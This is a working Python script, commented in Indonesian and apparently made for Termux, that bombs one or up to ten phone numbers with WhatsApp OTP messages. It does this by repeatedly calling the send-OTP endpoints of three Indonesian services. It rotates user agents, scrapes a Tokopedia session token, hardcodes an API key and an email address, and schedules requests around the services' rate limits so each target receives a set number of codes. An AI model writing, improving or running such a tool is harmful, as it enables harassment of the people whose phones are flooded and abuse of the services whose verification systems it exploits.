#!/usr/bin/env python3
"""
otp.py — WhatsApp OTP sender untuk Termux.

Jalan:
    python otp.py                -> menu (1. Single / 2. Bulk)
    python otp.py --list         -> info endpoint

Alur menu:
    1. Single Number  -> masukkan 1 nomor
    2. Bulk Number    -> masukkan beberapa nomor dipisah koma (maks 10)

Setelah nomor dimasukkan, script langsung jalan (auto) sampai target
tercapai. Satu worker per nomor, jalan paralel. Ctrl+C untuk berhenti.

Output hanya: SENT / COOLDOWN / FAIL
"""
from __future__ import annotations
import os
import re
import sys
import time
import uuid
import random
import threading
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
except ImportError:
    os.system(f"{sys.executable} -m pip install requests")
    import requests

EMAIL = os.environ.get("OTP_EMAIL", "jejakseo32221@gmail.com")
MAX_BULK = 10

UA = [
    "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
]

LOCK = threading.Lock()
TOTAL = 0


def _c(code):
    if not sys.stdout.isatty():
        return ""
    return {"g": "\033[92m", "y": "\033[93m", "r": "\033[91m",
            "b": "\033[96m", "w": "\033[97m", "x": "\033[0m"}.get(code, "")


def say(msg="", code=""):
    print(f"{_c(code)}{msg}{_c('x')}", flush=True)


# ---------------------------------------------------------------- nomor
def normalize(n):
    """Terima 08xx / 628xx / 8xx / +628xx. Kembalikan 4 varian atau None."""
    n = re.sub(r"\D", "", str(n))
    if n.startswith("62"):
        n = "0" + n[2:]
    elif n.startswith("8"):
        n = "0" + n
    if not n.startswith("08") or not (10 <= len(n) <= 14):
        return None
    return (n, "62" + n[1:], n[1:], "+62" + n[1:])


class Ctx:
    def __init__(self, raw):
        v = normalize(raw)
        if not v:
            raise ValueError(f"nomor tidak valid: {raw}")
        self.p08, self.p62, self.pnc, self.pplus = v

    def ua(self):
        return random.choice(UA)


# ---------------------------------------------------------------- judge
META = ("otp_status", "authid", "nextvalidattempt", "expired_time",
        "retry_time", "remaining_time", "expiresin", "retryafter",
        "otp_id", "verification_id", "countdown", "second", "expires_at")
NEG = ("captcha", "turnstile", "recaptcha", "invalid", "gagal", "ditolak",
       "forbidden", "unauthorized", "not allowed", "sign error",
       "missing required", "update dulu", "not valid", "tidak valid")


def judge(status, body):
    b = (body or "").lower()
    flat = b.replace(" ", "").replace("_", "")
    meta = [m for m in META if m in flat]
    neg = [n for n in NEG if n in b]
    if status in (200, 201, 204):
        if meta and not neg:
            return "SENT"
        return "FAIL"
    if status == 429:
        return "COOLDOWN"
    return "FAIL"


# ---------------------------------------------------------------- endpoint
def ep1(c):
    r = requests.post(
        "https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
        headers={"Content-Type": "application/json",
                 "Origin": "https://duniagames.co.id",
                 "x-device": str(uuid.uuid4()),
                 "User-Agent": c.ua()},
        json={"phoneNumber": c.pplus, "userName": c.pnc}, timeout=12)
    return judge(r.status_code, r.text)


def ep2(c):
    s = requests.Session()
    s.headers.update({"User-Agent": c.ua()})
    u = (f"https://accounts.tokopedia.com/otp/c/page?otp_type=116"
         f"&msisdn={c.p08}"
         f"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone"
         f"%26phone%3D{c.p08}%26status%3DeyJrIj...NlfQ%253D%253D")
    r1 = s.get(u, timeout=12)
    m = re.search(r'<input\s+id="Token"\s+value="(.*?)"\s*type="hidden"', r1.text)
    if not m:
        return "FAIL"
    r2 = s.post(
        "https://accounts.tokopedia.com/otp/c/ajax/request-wa",
        headers={"Origin": "https://accounts.tokopedia.com",
                 "Accept": "application/json",
                 "X-Requested-With": "XMLHttpRequest",
                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        data={"otp_type": "116", "msisdn": c.p08, "tk": m.group(1),
              "email": EMAIL, "original_param": "", "user_id": "",
              "signature": "", "number_otp_digit": "6"}, timeout=12)
    body = r2.text
    if r2.status_code == 200 and '"success":true' in body.replace(" ", ""):
        return "SENT"
    if "sudah melakukan" in body.lower() or "menit" in body.lower():
        return "COOLDOWN"
    return "FAIL"


def ep3(c):
    s = requests.Session()
    try:
        s.get("https://internetrakyat.id/auth/register",
              headers={"User-Agent": c.ua()}, timeout=10)
    except Exception:
        pass
    r = s.post("https://internetrakyat.id/api/app/auth/send-otp-register",
               headers={"Host": "internetrakyat.id",
                        "Content-Type": "application/json",
                        "x-api-key": "280999!FTTH",
                        "Origin": "https://internetrakyat.id",
                        "User-Agent": c.ua()},
               json={"phone_number": c.p08}, timeout=12)
    return judge(r.status_code, r.text)


ENDPOINTS = [("E1", ep1, 55), ("E2", ep2, 300), ("E3", ep3, 120)]


# ---------------------------------------------------------------- worker
class Worker:
    """Satu worker per nomor. Jalan sampai target atau dihentikan."""

    def __init__(self, raw_phone, target, stop_event):
        self.ctx = Ctx(raw_phone)
        self.label = self.ctx.p08
        self.target = target
        self.sent = 0
        self.stop = stop_event
        self.cool = {}

    def _log(self, status):
        global TOTAL
        with LOCK:
            if status == "SENT":
                self.sent += 1
                TOTAL += 1
            icon = {"SENT": "+", "COOLDOWN": "~"}.get(status, "x")
            col = {"SENT": "g", "COOLDOWN": "y"}.get(status, "r")
            say(f"[{icon}] {time.strftime('%H:%M:%S')} {self.label} "
                f"{status:9} {self.sent}/{self.target}", col)

    def _fire(self, name, fn, gap):
        if int(self.cool.get(name, 0) - time.time()) > 0:
            return
        try:
            st = fn(self.ctx)
        except Exception:
            st = "FAIL"
        if st in ("SENT", "COOLDOWN"):
            self.cool[name] = time.time() + gap
        self._log(st)

    def run(self):
        while self.sent < self.target and not self.stop.is_set():
            with ThreadPoolExecutor(max_workers=len(ENDPOINTS)) as ex:
                for name, fn, gap in ENDPOINTS:
                    ex.submit(self._fire, name, fn, gap)
            if self.sent >= self.target or self.stop.is_set():
                break
            waits = [int(self.cool.get(n, 0) - time.time()) for n, _, _ in ENDPOINTS]
            waits = [w for w in waits if w > 0]
            nap = max(5, min(min(waits) if waits else 30, 60))
            for _ in range(nap):
                if self.stop.is_set():
                    break
                time.sleep(1)


# ---------------------------------------------------------------- menu
def ask(prompt):
    try:
        return input(prompt).strip()
    except EOFError:
        raise KeyboardInterrupt


def menu():
    say("=" * 52, "r")
    say("   OTP SENDER", "r")
    say("=" * 52, "r")
    say("")
    say("  1. Single Number", "b")
    say("  2. Bulk Number (maks 10)", "b")
    say("")
    while True:
        ch = ask("  pilih [1/2] : ")
        if ch in ("1", "2"):
            break
        say("  !! pilih 1 atau 2", "y")

    numbers = []
    if ch == "1":
        say("")
        while True:
            n = ask("  nomor WhatsApp : ")
            if normalize(n):
                numbers.append(n)
                break
            say("  !! nomor tidak valid, coba lagi", "y")
    else:
        say("")
        say("  pisahkan dengan koma. contoh:", "w")
        say("  081511624778,08212398494,085697218463")
        say("")
        while True:
            raw = ask("  nomor : ")
            parts = [p.strip() for p in re.split(r"[,\s]+", raw) if p.strip()]
            if not parts:
                say("  !! kosong", "y")
                continue
            if len(parts) > MAX_BULK:
                say(f"  !! maksimal {MAX_BULK} nomor, kamu kasih {len(parts)}", "y")
                continue
            bad = [p for p in parts if not normalize(p)]
            if bad:
                say(f"  !! tidak valid: {', '.join(bad)}", "y")
                continue
            numbers = parts
            break

    say("")
    tgt = ask("  target OTP per nomor [15] : ")
    target = int(tgt) if tgt.isdigit() and int(tgt) > 0 else 15

    say("")
    say("-" * 52)
    say(f"  nomor  : {len(numbers)}")
    for n in numbers:
        say(f"    - {normalize(n)[0]}")
    say(f"  target : {target} per nomor")
    say(f"  total  : {target * len(numbers)} OTP")
    say("-" * 52)
    say("")
    say("  Ctrl+C untuk berhenti", "y")
    say("")
    run(numbers, target)


def run(numbers, target):
    global TOTAL
    TOTAL = 0
    stop = threading.Event()
    workers = [Worker(n, target, stop) for n in numbers]
    t0 = time.time()

    say("=" * 52, "g")
    say(f"  MULAI — {len(workers)} nomor, {target} OTP masing-masing", "g")
    say("=" * 52, "g")
    say("")

    threads = [threading.Thread(target=w.run, daemon=True) for w in workers]
    try:
        for t in threads:
            t.start()
        for t in threads:
            while t.is_alive():
                t.join(timeout=1)
    except KeyboardInterrupt:
        say("")
        say("  menghentikan...", "y")
        stop.set()
        for t in threads:
            t.join(timeout=5)

    el = int(time.time() - t0)
    say("")
    say("=" * 52, "g")
    say(f"  {TOTAL} terkirim dalam {el}s", "g")
    say("=" * 52, "g")
    for w in workers:
        say(f"    {w.label}  {w.sent}/{w.target}")
    say("")
    say("  Cek WhatsApp. Hitung yang benar-benar masuk.")


def main():
    if "--list" in sys.argv:
        say(f"  endpoint: {len(ENDPOINTS)}")
        for i, (_, _, gap) in enumerate(ENDPOINTS, 1):
            say(f"    #{i}  jeda {gap}s")
        return
    menu()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        say("\n[stop]", "y")
